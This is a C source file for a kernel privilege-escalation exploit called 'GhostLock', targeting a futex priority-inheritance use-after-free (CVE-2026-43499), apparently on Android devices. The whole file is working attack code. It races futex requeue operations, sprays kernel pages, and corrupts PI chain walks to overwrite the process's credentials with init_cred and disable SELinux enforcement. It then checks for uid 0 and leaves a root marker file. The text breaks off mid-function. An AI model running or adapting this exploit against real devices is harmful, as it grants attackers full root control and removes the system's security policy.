/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/system_properties.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>

const struct kernel_offsets *active_offsets = NULL;

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      /* Publish per-device symbol addresses that other TUs need. INIT_CRED
       * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
       * table entry rather than target.h's compile-time constant. */
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      /* phys_offset=0 is valid (Amlogic S905X3 has RAM at phys 0) */
      if (active_offsets->phys_offset || active_offsets->kernel_phys_load < 0x10000000) {
        p0_phys_offset = active_offsets->phys_offset;
      }
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int ghost_bug_armed;
atomic_int route_in_handler;
atomic_int waiter_futex_returned;
atomic_int consumer_walks_done;
atomic_int consumer_erase_hits;
/* Post-walks_done settle delay (ms) before the main thread's first
 * post-swap syscalls; configured pre-walk via GHOST_SETTLE_MS. */
static int g_settle_ms = 4000;
int g_consumer_nice = 0;
int memfd_leak;

int consumer_nice_headroom(void) {
  return g_consumer_nice < 19;
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* The overlay-route signal is thread-directed at this thread; make sure
   * it is deliverable here regardless of the creating thread's mask. */
  {
    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGUSR1);
    pthread_sigmask(SIG_UNBLOCK, &set, NULL);
  }
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  {
    errno = 0;
    long wr = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
    int we = errno;
    atomic_store(&waiter_futex_returned, 1);
    printf("[TRIG] waiter WAIT_REQUEUE_PI ret=%ld errno=%d (EDEADLK=%d means bug armed)\n",
           wr, we, wr == -EDEADLK);
  }
  /* Walk-before-cleanup: if the SIGUSR1 handler ran while this futex was
   * interrupted (-ERESTARTNOINTR), the overlay + the consumer's PI walks
   * already happened on this thread's kernel stack, and reaching this
   * point means the restarted futex has already run its ETIMEDOUT
   * cleanup path over the QUIESCED spray page. Only run the route inline
   * in the legacy flow (GHOST_SIGNAL_ROUTE=0, or the signal never came). */
  if (!atomic_load(&route_in_handler))
    do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  /* skip UNLOCK_PI on f_pi_chain in cred modes (6/7) -- the PI state is
   * corrupted and touching it can crash. The owner thread will hang but
   * we don't care. */
  if (!write_mode_is_cred(pselect_custom_write))
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  if (!write_mode_is_cred(pselect_custom_write))
    while (!atomic_load(&owner_chain_done)) usleep(1000);
  /* PARK instead of exiting. In cred mode this task's pi_blocked_on
   * dangles at an rt_mutex_waiter on this thread's kernel stack; the
   * ETIMEDOUT cleanup (REARM'd) survived, but the mid-process thread
   * teardown right after "WAIT_REQUEUE_PI ret=-1 errno=110" panicked
   * the device in roughly half of post-root runs. A sleeping thread is
   * never PI-walked again (no prio changes), its stack keeps the
   * dangling target mapped, and the final exit_group teardown is the
   * path the fully-surviving runs already exercised. */
  for (;;) sleep(1);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

static uintptr_t perf_leak_own_task(void);
uintptr_t g_consumer_task = 0;
void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  /* Consumer perf leak disabled -- causes reclaim failures. */
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    /* Same-page overlay retry (walk-before-cleanup flow): when a previous
     * round quenched the page after landing erase(s), re-arm W0 + the lock
     * tree + fake_task->pi_waiters from the PENDING plan before this
     * round's first walk. The quiesce zeroes the tree roots (they point at
     * the previous overlay's kernel-stack waiter, which is dead data once
     * that sendmsg unwound) and clears W0.pi_tree.rb_right (the write
     * VALUE), so without this re-arm the next walk would hit a NULL
     * prerequeue_top_waiter -> NULL-deref in rt_mutex_dequeue_pi. */
    if (seq >= 2 && write_mode_is_cred(pselect_custom_write) &&
        atomic_load(&consumer_erase_hits) >= 1 &&
        atomic_load(&consumer_erase_hits) < ghost_plan_count()) {
      ghost_apply_next_plan(atomic_load(&consumer_erase_hits) - 1);
    }
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        /* Retarget walk 0 to consumer's real_cred if we have our task */
        if (calls_this_seq == 0 && write_mode_is_cred(pselect_custom_write) &&
            g_consumer_task) {
          uintptr_t cpc = (g_consumer_task + TASK15_REAL_CRED_OFF - 8) | 1;
          for (int b2 = 0; ; b2++) {
            uint8_t *pg2 = uring_block(b2);
            if (!pg2) break;
            put64(pg2, W0_OFF + 0x18, cpc);
          }
          char m3[96];
          int n3 = snprintf(m3, sizeof(m3), "[RETARGET] walk 0 -> consumer real_cred %016lx\n",
                            (unsigned long)(g_consumer_task + TASK15_REAL_CRED_OFF));
          write(1, m3, n3);
        }
        {
          char m[64];
          int n = snprintf(m, sizeof(m), "[FIRE %d] tid=%d\n", calls_this_seq, tid);
          if (write(1, m, n) < 0) { /* ignore */ }
        }
        errno = 0;
        struct timespec t0, t1;
        clock_gettime(CLOCK_MONOTONIC, &t0);
        /* Monotonic nice ladder across ALL overlay rounds: each call must
         * be a real priority change, else __sched_setscheduler exits early
         * without walking (GATE A), and a decrease would be EPERM (GATE B)
         * and divert to the uncontrolled FUTEX_LOCK_PI fallback walk. */
        int nice = g_consumer_nice + 7;
        if (nice > 19) nice = 19;
        g_consumer_nice = nice;
        {
          int pre_nice = getpriority(PRIO_PROCESS, tid);
          char m[128];
          int n = snprintf(m, sizeof(m), "[NICE] walk %d: %d -> %d\n",
                           calls_this_seq, pre_nice, nice);
          write(1, m, n);
        }
        long sched_ret = sched_setattr_tid(tid, nice);
        /* Check ALL uring payload blocks for walk modification */
        if (write_mode_is_cred(pselect_custom_write)) {
          int found = -1;
          uint64_t expected_armed = *(volatile uint64_t *)((uint8_t *)uring_sqes + W0_OFF + 0x18);
          for (int bi = 0; ; bi++) {
            uint8_t *pg = uring_block(bi);
            if (!pg) break;
            uint64_t pc_i = *(volatile uint64_t *)(pg + W0_OFF + 0x18);
            if (pc_i != expected_armed) { found = bi; break; }
          }
          char mc[128];
          int nc2;
          if (found >= 0) {
            uint64_t pc_f = *(volatile uint64_t *)(uring_block(found) + W0_OFF + 0x18);
            g_hit_block = found;
            nc2 = snprintf(mc, sizeof(mc), "[WALKCHK %d] FOUND on block %d pc=%016llx\n",
                           calls_this_seq, found, (unsigned long long)pc_f);
            /* Erase-hit oracle: the walk's rb_erase wrote the
             * __rb_clear_node marker (&victim) into W0.pi_tree.pc on the
             * mapping that backs the leaked mm page. Only count a hit when
             * the pre-walk state was the armed plan (not already the
             * marker), so no-op calls can not double-count. */
            if (pc_f == (uint64_t)(page_base + W0_OFF + 0x18) &&
                expected_armed != (uint64_t)(page_base + W0_OFF + 0x18)) {
              int hits = atomic_fetch_add(&consumer_erase_hits, 1) + 1;
              char hm[96];
              int hn = snprintf(hm, sizeof(hm), "[ERASE %d] rb_erase write landed (hits=%d/%d)\n",
                                calls_this_seq, hits, ghost_plan_count());
              write(1, hm, hn);
            }
          } else {
            nc2 = snprintf(mc, sizeof(mc), "[WALKCHK %d] NOT FOUND in any block (all=%016llx)\n",
                           calls_this_seq, (unsigned long long)expected_armed);
          }
          write(1, mc, nc2);
        }
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long dur_ns = (t1.tv_sec - t0.tv_sec) * 1000000000L + (t1.tv_nsec - t0.tv_nsec);
        {
          char m[96];
          int n = snprintf(m, sizeof(m), "[RET %d] sched_ret=%ld errno=%d dur=%ldus\n",
                          calls_this_seq, sched_ret, errno, dur_ns / 1000);
          if (write(1, m, n) < 0) { /* ignore */ }
        }
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          {
            char m[96];
            int n = snprintf(m, sizeof(m), "[FB %d] fret=%ld\n", calls_this_seq, fret);
            if (write(1, m, n) < 0) { /* ignore */ }
          }
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        /* Each sched_setattr (or its futex fallback) ran one synchronous
         * ghost chain walk. Queue the next write into W0.pi_tree_entry
         * through the SQE mmap for the following walk (if any). */
        ghost_apply_next_plan(calls_this_seq);
        /* Dump map 64's W0 state after re-arm */
        if (write_mode_is_cred(pselect_custom_write) && calls_this_seq == 0 &&
            uring_count > 64) {
          uint8_t *m64 = (uint8_t *)uring_maps[64];
          uint32_t w0_prio = *(uint32_t *)(m64 + W0_OFF + 0x44);
          uint64_t w0_pc = *(uint64_t *)(m64 + W0_OFF + 0x18);
          uint64_t lk_root = *(uint64_t *)(m64 + LOCK_OFF + 0x08);
          uint64_t lk_left = *(uint64_t *)(m64 + LOCK_OFF + 0x10);
          uint64_t pi_root = *(uint64_t *)(m64 + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF);
          char dm[192];
          int dn = snprintf(dm, sizeof(dm),
            "[REARM64] W0.prio=%u pc=%016llx lk.root=%016llx lk.left=%016llx pi.root=%016llx\n",
            w0_prio, (unsigned long long)w0_pc,
            (unsigned long long)lk_root, (unsigned long long)lk_left,
            (unsigned long long)pi_root);
          write(1, dm, dn);
        }
        calls_this_seq++;
        // ponytail: 1 walk per overlay round -- waiter_update_prio clamps CAL_PRIO to 120, blocking walk 1's oracle
        int round_budget = g_write_plans_active ? 1 : ghost_plan_count();
        if (calls_this_seq >= round_budget) {
          atomic_store(&punch_consume_go, 0);
          /* Quiesce the spray page before the waiter's futex return path
           * walks it while holding hb->lock. Clear all tree roots, lock
           * fields, and owner so cleanup_proxy_lock sees empty trees. */
          if (write_mode_is_cred(pselect_custom_write)) {
            /* Full quiesce: release spinlocks, clear trees, repair uid.
             * The waiter thread spins on page spinlock words (wait_lock
             * and/or pi_lock) held by the walk. Zero them to release.
             * Patch EVERY 16KB payload block (multi-order spectrum
             * mappings carry one payload copy per block). */
            for (int b = 0; ; b++) {
              uint8_t *pg = uring_block(b);
              if (!pg) break;
              /* Release spinlocks FIRST (breaks the spin) */
              *(volatile uint32_t *)(pg + LOCK_OFF) = 0;                    /* wait_lock */
              *(volatile uint32_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF) = 0; /* pi_lock */
              /* NULL W0 children */
              *(volatile uint64_t *)(pg + W0_OFF + 0x08) = 0;
              *(volatile uint64_t *)(pg + W0_OFF + 0x10) = 0;
              *(volatile uint64_t *)(pg + W0_OFF + 0x20) = 0;
              *(volatile uint64_t *)(pg + W0_OFF + 0x28) = 0;
              /* Clean tree roots + owner */
              *(volatile uint64_t *)(pg + LOCK_OFF + 0x08) = 0;
              *(volatile uint64_t *)(pg + LOCK_OFF + 0x10) = 0;
              *(volatile uint64_t *)(pg + LOCK_OFF + 0x18) = 0;
              *(volatile uint64_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF) = 0;
              *(volatile uint64_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8) = 0;
              /* Repair uid/gid */
              *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_UID_OFF) = 0;
              *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_GID_OFF) = 0;
            }
            __atomic_thread_fence(__ATOMIC_SEQ_CST);
            *(volatile uint32_t *)&f_pi_target = 0;
            *(volatile uint32_t *)&f_pi_chain = 0;
            *(volatile uint32_t *)&f_wait = 0;
            __atomic_thread_fence(__ATOMIC_SEQ_CST);
            /* Write main thread's procfs uid to file and exit immediately.
             * Don't wait -- the main thread is stuck from CPU saturation. */
            {
              char sp[64], sb[512], ob[256];
              pid_t mp = getpid();
              snprintf(sp, sizeof(sp), "/proc/%d/task/%d/status", mp, mp);
              int sf = open(sp, O_RDONLY);
              if (sf >= 0) {
                int n = read(sf, sb, sizeof(sb)-1);
                close(sf);
                if (n > 0) {
                  sb[n] = 0;
                  char *u = strstr(sb, "Uid:");
                  if (u) { char *nl = strchr(u, '\n'); if (nl) *nl = 0; }
                  int ol2 = snprintf(ob, sizeof(ob), "[+] main: %s\n", u ? u : "?");
                  write(1, ob, ol2);
                  int mf = open("/data/local/tmp/.ghostlock_root",
                                O_WRONLY|O_CREAT|O_TRUNC|O_SYNC, 0644);
                  if (mf >= 0) { write(mf, ob, ol2); fsync(mf); close(mf); }
                }
              }
            }
            /* SELinux-off verification (mode 7): this consumer thread has a
             * normal SELinux context and can read selinuxfs from the start,
             * so after each round we can prove whether the zero-write landed:
             * enforcing="0" right after an erase hit on plan 0 means the
             * selinux_state address (kaslr + off_selinux_enforcing) was
             * correct. Read via raw syscalls for consistency with the
             * post-walk environment (consumer libc works, but keep the
             * wedge-path raw). */
            if (pselect_custom_write == WRITE_MODE_CRED_SELINUX) {
              long ef = syscall(__NR_openat, AT_FDCWD,
                                "/sys/fs/selinux/enforce", O_RDONLY, 0);
              if (ef >= 0) {
                char eb[16];
                long en = syscall(__NR_read, ef, eb, sizeof(eb) - 1);
                syscall(__NR_close, ef);
                int eoff = (en > 0 && eb[0] == '0');
                if (eoff) g_selinux_off = 1;
                char em[128];
                int el = snprintf(em, sizeof(em),
                    "[SELINUX] enforce=%c after %d walk(s)%s\n",
                    en > 0 ? eb[0] : '?',
                    atomic_load(&consumer_erase_hits),
                    eoff ? " - SELinux OFF, write landed" : "");
                write(1, em, el);
              }
            }
            /* Publish completion only when this route can contribute
             * nothing more: every planned erase landed, or the nice ladder
             * is exhausted (no further sched_setattr can produce a real
             * priority change -> no further walk can ever fire). If erases
             * are still pending, stay alive: the route's next overlay
             * round (a fresh sendmsg re-writes waiter->prio=CAL_PRIO, and
             * the monotonic ladder supplies the priority change) re-fires
             * the pending plan. The main thread waits for this flag (plus
             * its erase-count bound) before it exec()s, so the exec can
             * never kill the consumer mid-walk. */
            if (atomic_load(&consumer_erase_hits) >= ghost_plan_count() ||
                !consumer_nice_headroom()) {
              atomic_store(&consumer_walks_done, 1);
              { static const char cd[] = "[DBG] consumer: walks_done=1 set\n";
                write(1, cd, sizeof(cd) - 1); }
              /* Stop the consumer for good: no further walks may fire
               * after this point -- the waiter's futex restarts once the
               * handler returns and re-initializes the rt_mutex_waiter
               * that the dangling pi_blocked_on points at. */
              atomic_store(&punch_consume_stop, 1);
            }
            /* Don't exit -- let the main thread handle exec. */
          }
          break;
        }
      }
    }
  }
  /* PARK instead of exiting: mid-process teardown of the pinned consumer
   * right after the final walk raced the kernel's PI-state quiesce and
   * panicked the device post-root (same crash window as the waiter's
   * teardown). A sleeping pinned thread triggers no PI walks. */
  for (;;) sleep(1);
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  atomic_store(&ghost_bug_armed, 0);
  atomic_store(&route_in_handler, 0);
  atomic_store(&waiter_futex_returned, 0);
  atomic_store(&consumer_walks_done, 0);
  atomic_store(&consumer_erase_hits, 0);
  g_consumer_nice = 0;
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  /* Install the in-handler overlay route (walk-before-cleanup): the
   * handler runs on whichever thread receives the thread-directed
   * SIGUSR1 (main sends it to the waiter tid right after the CMP_REQUEUE_PI
   * arms the bug). See ghost_usr1_handler() in fops.c. */
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = ghost_usr1_handler;
    sigemptyset(&sa.sa_mask);
    sigaddset(&sa.sa_mask, SIGUSR1); /* block re-entry inside the handler */
    sa.sa_flags = SA_RESTART;
    sigaction(SIGUSR1, &sa, NULL);
  }
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  {
    long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    int re = errno;
    printf("[TRIG] main CMP_REQUEUE_PI ret=%ld errno=%d (EDEADLK=%d means cycle hit)\n",
           rr, re, rr == -EDEADLK);
    /* Walk-before-cleanup restructure: with the CVE armed (the EDEADLK
     * rollback in rt_mutex_start_proxy_lock -> remove_waiter cleared
     * CURRENT's pi_blocked_on, not the waiter task's -- so the waiter
     * task's pi_blocked_on now dangles at the rt_mutex_waiter inside its
     * STILL RUNNING FUTEX_WAIT_REQUEUE_PI syscall), signal the waiter.
     *
     * The futex returns -ERESTARTNOINTR (kernel-internal), the SIGUSR1
     * handler runs the SEQPACKET overlay route on the waiter's kernel
     * stack at the exact same syscall-entry depth, the consumer fires the
     * PI chain walks against that overlay while the handler blocks in
     * sendmsg, and only then does the handler return -- the futex
     * restarts, times out immediately against its original absolute
     * deadline, and its ETIMEDOUT cleanup path runs over the QUIESCED
     * spray page (it only takes hb->lock and plist_del's the futex_q;
     * it can never contend a page spinlock). */
    if (ghost_signal_route_enabled() && rr == -1 && re == EDEADLK) {
      atomic_store(&ghost_bug_armed, 1);
      int wtid = atomic_load(&waiter_tid);
      long kr = syscall(SYS_tgkill, getpid(), wtid, SIGUSR1);
      printf("[TRIG] main SIGUSR1 -> waiter tid=%d ret=%ld (overlay route fires in-handler)\n",
             wtid, kr);
    }
  }
  reset_cpu_pin();
  if (write_mode_is_cred(pselect_custom_write)) {
    /* Wait for consumer to finish ALL planned walks (budget=1 per round
     * means one overlay round per planned erase - 3 rounds for mode 7,
     * each costing the 3 s SO_SNDTIMEO of its overlay sendmsg). Only then
     * poll getuid -- the uid repair in the quiesce happens after the
     * last erase, and the old 15 s poll could expire before the final
     * round could fire. Raw syscalls only: past this point the walks
     * may have wedged libc for the MAIN thread (see HANDOVER_2 - the
     * old pr_info after the cred swap deadlocked). */
    {
      static const char w0[] = "[DBG] main: entering wait loop\n";
      syscall(__NR_write, 1, w0, sizeof(w0) - 1);
      struct timespec wd;
      clock_gettime(CLOCK_MONOTONIC, &wd);
      int ticks = 0;
      while (!atomic_load(&consumer_walks_done)) {
        struct timespec wn;
        clock_gettime(CLOCK_MONOTONIC, &wn);
        long elapsed = wn.tv_sec - wd.tv_sec;
        if (elapsed >= 30) break;
        if (++ticks % 5000000 == 0) {
          static const char wp[] = "[DBG] main: waiting... hits=";
          syscall(__NR_write, 1, wp, sizeof(wp) - 1);
          char tb[16]; int tl = 0;
          int h = atomic_load(&consumer_erase_hits);
          if (h == 0) tb[tl++] = '0';
          else { if (h >= 10) tb[tl++] = '0' + h/10; tb[tl++] = '0' + h%10; }
          syscall(__NR_write, 1, tb, tl);
          static const char tn[] = "\n";
          syscall(__NR_write, 1, tn, 1);
        }
        __asm__ volatile("yield" ::: "memory");
      }
      int done = atomic_load(&consumer_walks_done);
      static const char w1[] = "[DBG] main: wait done, walks_done=";
      syscall(__NR_write, 1, w1, sizeof(w1) - 1);
      char db[4]; db[0] = '0' + done; db[1] = '\n';
      syscall(__NR_write, 1, db, 2);
      syscall(__NR_fsync, 1);
      /* Settle before the first post-swap syscalls: the in-handler route
       * may still be inside its round-N sendmsg (SO_SNDTIMEO ~3s); when
       * it returns, the waiter's futex restarts and its ETIMEDOUT cleanup
       * runs over the quiesced spray page, then the consumer exits. Doing
       * that unwind with no concurrent main-thread activity removes one
       * crash window (observed: device died post-walks_done before this
       * delay existed). */
      if (g_settle_ms > 0 && done) {
        struct timespec st;
        st.tv_sec = g_settle_ms / 1000;
        st.tv_nsec = (long)(g_settle_ms % 1000) * 1000000L;
        syscall(__NR_nanosleep, &st, NULL);
      }
    }
    uint32_t uid_orig = 2000;
    uint32_t uid_now = syscall(__NR_getuid);
    {
      static const char u0[] = "[DBG] main: getuid=";
      syscall(__NR_write, 1, u0, sizeof(u0) - 1);
      char ub[16]; int ul = 0;
      unsigned long uv = uid_now;
      if (uv == 0) { ub[ul++] = '0'; }
      else { char tmp[12]; int ti = 0; while (uv) { tmp[ti++] = '0' + uv%10; uv /= 10; } while (ti) ub[ul++] = tmp[--ti]; }
      syscall(__NR_write, 1, ub, ul);
      static const char u1[] = "\n";
      syscall(__NR_write, 1, u1, 1);
    }
    g_route_write_ok = (uid_now != uid_orig);
    /* Raw readback of the SELinux enforcing flag (readable by the shell
     * context since boot, so this works no matter which cred we hold).
     * "0" here is the on-device proof that the mode-7 plan-0 zero-write
     * hit the real selinux_state. */
    {
      long ef = syscall(__NR_openat, AT_FDCWD,
                        "/sys/fs/selinux/enforce", O_RDONLY, 0);
      if (ef >= 0) {
        char eb[16];
        long en = syscall(__NR_read, ef, eb, sizeof(eb) - 1);
        syscall(__NR_close, ef);
        int eoff = (en > 0 && eb[0] == '0');
        if (eoff) g_selinux_off = 1;
        static const char pre[] = "[SELINUX] main: enforce=";
        syscall(__NR_write, 1, pre, sizeof(pre) - 1);
        if (en > 0) syscall(__NR_write, 1, eb, en);
        if (eoff) {
          static const char ok[] = " -> SELinux OFF\n";
          syscall(__NR_write, 1, ok, sizeof(ok) - 1);
        } else {
          static const char no[] = "\n";
          syscall(__NR_write, 1, no, sizeof(no) - 1);
        }
      }
    }
  } else {
    while (!atomic_load_explicit(&route_done, memory_order_acquire))
      __asm__ volatile("yield" ::: "memory");
  }
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  ghost_reset_plans();
  g_route_write_ok = 0;
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
  if (mode == 6) {
    /* Walk 0: cred. Plan: walk 1 targets real_cred (= target - 8). */
    ghost_push_plan(pselect_custom_target - 8, page_base + FAKE_CRED_OFF);
    pr_info("  walk0: cred, walk1: real_cred, fake_cred=%016zx plans=%d\n",
            page_base + FAKE_CRED_OFF, ghost_plan_count());
  }
  if (mode == WRITE_MODE_CRED_SELINUX) {
